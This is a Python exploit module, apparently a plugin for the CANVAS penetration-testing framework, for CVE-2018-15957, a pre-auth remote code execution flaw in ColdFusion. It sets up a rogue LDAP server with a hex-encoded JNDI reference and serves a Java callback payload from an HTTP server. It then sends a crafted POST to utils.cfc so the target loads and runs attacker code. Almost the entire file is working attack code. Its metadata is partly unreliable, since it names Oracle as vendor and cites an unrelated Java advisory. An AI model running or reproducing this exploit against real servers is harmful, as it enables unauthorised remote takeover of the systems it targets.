#!/usr/bin/env python2
import sys
if '.' not in sys.path:
    sys.path.append('.')

import canvasengine
from exploitutils import *
from tcpexploit import tcpexploit

import libs.spkproxy as spkproxy
import threading
import socket
import binascii
import time



NAME                            = 'CVE-2018-15957'
DESCRIPTION                     = 'Pre-auth RCE on ColdFusion through JNDI Injection using LDAP poisoning'
DOCUMENTATION                   = {}
DOCUMENTATION['VENDOR']         = "Oracle"
DOCUMENTATION["Repeatability"]  = 'Infinite'
DOCUMENTATION["CVE Name"]       = 'CVE-2018-15957'
DOCUMENTATION["CVE Url"]        = "http://cve.mitre.org/cgi-bin/cvename.cgi?name=2018-15957"
DOCUMENTATION["References"]     = "http://www.oracle.com/technetwork/topics/security/javacpufeb2011-304611.html"
DOCUMENTATION["Date public"]    = "09/11/2018"
DOCUMENTATION["NOTES"]          = """
This exploit will work against ColdFusion 2018 update 1, ColdeFusion 2016 <= update 6 and ColdFusion 11 <= update 14.
"""

VERSION                         = "0.1"

PROPERTY                        = {}
PROPERTY['TYPE']                = "Exploit"
PROPERTY['SITE']                = "Serverside"
PROPERTY['ARCH']                = [ ["UNIX"], ["Windows"] ]
PROPERTY['VERSION']             = []
PROPERTY['DELIVERY']            = 'HTTP and LDAP'

TARGETS = { 0 : ['JDK/JRE <= 6 Update 23'] }


class theexploit(tcpexploit):
    def __init__(self):
        tcpexploit.__init__(self)
        self.name = NAME
        self.path = os.path.dirname(__file__)
        self.mosdef_type = "JAVA"
        self.payloadType = 0
        self.javamosdef_data = None

        # Initial request
        self.host = ""
        self.port = 8500
        self.https = False
        self.hostname = None
        self.path = ''
        self.ua = None

        self.basicauth_user = ""
        self.basicauth_password = ""

        # LDAP
        self.ldap_ip = None
        self.ldap_port = 9000

        # JNDI
        self.jndi_port = 8082

        # MOSDEF
        self.bindport = 5555
        #self.ssl_mosdef = False

    def neededListenerTypes(self):
        return [canvasengine.UNIVERSAL_MOSDEF]

    def getargs(self):

        # Initial request
        #self.getarg('host')
        self.host = self.target.interface
        self.port = int(self.argsDict.get("port", self.port))
        self.getarg('https')
        self.getarg('path')

        self.getarg('basicauth_user')
        self.getarg('basicauth_password')
        self.basicauth = self.basicauth_user != ''

        # LDAP
        #logging.debug('Callback ip', self.callback.ip)
        self.ldap_ip = self.callback.ip
        #logging.debug('LDAP ip', self.ldap_ip)
        self.ldap_port = int(self.argsDict.get('ldap_port', self.ldap_port))

        # JNDI
        self.jndi_port = int(self.argsDict.get('jndi_port', self.jndi_port))

        # MOSDEF
        self.bindport = int(self.argsDict.get('bindport', self.bindport))
        #self.ssl_mosdef = bool(self.argsDict.get('ssl_mosdef',
        #                                         self.ssl_mosdef))

    def start_ldap_server(self):
        # LDAP anonymous access confirmation
        p1 = '300c02010161070a010004000400'
        # LDAP response that contains a Naming Reference pointing to our MOSDEF
        # payload in the JNDI server
        p2 = '3081b20201026481ac041b6f753d6d6f736465662c64633d6578616d706c652c64633d6f726730818c3029040b6f626a656374436c617373311a04136a6176614e616d696e675265666572656e63650403746f703019040d6a617661436c6173734e616d65310804066d6f736465663017040b6a617661466163746f7279310804066d6f73646566302b040c6a617661436f646542617365311b0419687474703a2f2f7b49507d3a7b706f72747d2f300c02010265070a010004000400'

        logging.info('Starting LDAP server')
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        s.settimeout(60)
        logging.debug('Socket created')
        s.bind(('0.0.0.0', self.ldap_port))
        logging.debug('Socket binded')
        s.listen(1)
        try:
            client, addr = s.accept()

            logging.info('Recieved connection to LDAP')
            client.recv(2048)
            logging.debug('Sending p1')
            client.sendall(binascii.unhexlify(p1))
            client.recv(2048)
            p2 = binascii.unhexlify(p2).replace(b'{IP}', self.callback.ip).replace(b'{port}',str(self.jndi_port))
            logging.debug('Sending p2')
            client.sendall(p2)
            logging.info('LDAP payload sent')
            client.close()
        except socket.timeout:
            logging.info('Connection timeout while waiting for LDAP connection')
        finally:
            s.close()

    def setup_jndi_server(self):
        logging.info('Setting up JNDI server')

        app = self.engine.getModuleExploit("httpserver")
        app.link(self)
        app.argsDict["port"] = self.jndi_port
        app.argsDict["singleexploit"] = "upload"
        app.argsDict["auto_port"] = False
        app.argsDict["sourcedata"] = self.mosdef
        app.run()

        app.s.close() # Close the listening socket

    def make_mosdef(self):
        logging.info('Creating mosdef.class payload')
        logging.debug('\tIP: {}\n\tPort: {}'.format(self.callback.ip, self.callback.port))
        mosdef = open(
                    os.path.abspath(
                        os.path.join(
                            os.path.dirname(__file__),
                            "Resources/",
                            "mosdef.class"
                        )
                    ),
                    'rb'
                ).read()

        def replace_in_mosdef(mosdef, src, dst):
            return mosdef.replace(src, dst + ' '*(len(src)-len(dst)))


        mosdef = replace_in_mosdef(
                    mosdef,
                    'AAAAAAAAAAAAAAAAAAAAAA',
                    'http://%s%.4d' % (
                        self.encode_ip(self.callback.ip),
                        self.bindport
                    )
                )
        mosdef = replace_in_mosdef(
                    mosdef,
                    'IIIIIIIIIIIIIIII',
                    self.callback.ip
                )
        mosdef = replace_in_mosdef(
                    mosdef,
                    'PPPPPPPP',
                    str(self.callback.port)
                )

        try:
            typ = self.engine.getMosdefType(canvasengine.JAVASERVER)
        except:
            typ = 15
        #self.mosdef = mosdef.replace("TTTTTTTT", str(typ)+" "*(8 - len(str(typ))))
        self.mosdef = replace_in_mosdef(
                        mosdef,
                        'TTTTTTTT',
                        str(typ)
                    )

    def send_initial_request(self):
        auth = None
        if self.basicauth:
            logging.debug('Using basic auth {}:{}'.format(self.basicauth_user,
                                                          self.basicauth_password))
            auth = spkproxy.BasicAuth(self.basicauth_user, self.basicauth_password)

        url = 'https' if self.https else 'http'
        url += '://' + self.host
        url += ':' + str(self.port)
        url += self.path
        url += '/CFIDE/wizards/common/utils.cfc'

        postdata = 'method=verifyldapserver&vusername=&vpassword=&vserver='
        postdata += self.ldap_ip
        postdata += '&vport='
        postdata += str(self.ldap_port)
        postdata += '&vstart=ou%3dmosdef%2cdc%3dexample%2cdc%3dorg'

        logging.info('Sending initial request')

        ua = spkproxy.UserAgent(url, exploit=self, auth=auth,hostname=self.host)
        ua.addHeader("Content-Type",  "application/x-www-form-urlencoded")
        ua.POST("", postdata, [], noresponse=False)

        logging.info('Sent')

    def run(self):
        self.getargs()
        self.make_mosdef()

        jndi_server = threading.Thread(target=self.setup_jndi_server)
        ldap_server = threading.Thread(target=self.start_ldap_server)

        ldap_server.start()
        jndi_server.start()

        time.sleep(1)

        self.send_initial_request()

        ldap_server.join()
        jndi_server.join()

    def encode_ip(self, ip):
        t = lambda x: [i for i in x.split('.') ]
        l = lambda x: "%.2x" % int(x)
        j = lambda x: int("".join(x),16)
        return j(map(l,t(ip)))

if __name__ == '__main__':
    logging.info("Running CANVAS %s Exploit v %s" % (DESCRIPTION, VERSION))
    app = theexploit()
    ret = standard_callback_commandline(app)
